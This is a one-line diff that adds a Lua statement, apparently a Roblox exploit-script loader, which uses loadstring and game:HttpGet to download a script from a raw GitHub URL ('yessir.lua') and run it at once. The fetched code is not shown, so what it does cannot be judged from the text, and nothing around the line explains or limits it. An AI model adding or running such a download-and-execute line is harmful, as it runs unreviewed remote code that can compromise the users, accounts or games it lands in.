@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ffedex/0.1x/refs/heads/main/yessir.lua"))()
